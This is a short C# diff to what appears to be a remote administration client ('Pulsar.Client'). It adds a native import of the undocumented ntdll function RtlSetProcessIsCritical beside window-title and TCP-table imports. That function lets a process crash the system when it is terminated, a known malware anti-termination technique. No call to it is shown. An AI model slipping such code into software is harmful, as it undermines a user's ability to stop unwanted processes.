@@ -138,6 +138,9 @@ namespace Pulsar.Client.Utilities
         [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
         internal static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
 
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
+
         [DllImport("iphlpapi.dll", SetLastError = true)]
         internal static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion,
             TcpTableClass tblClass, uint reserved = 0);
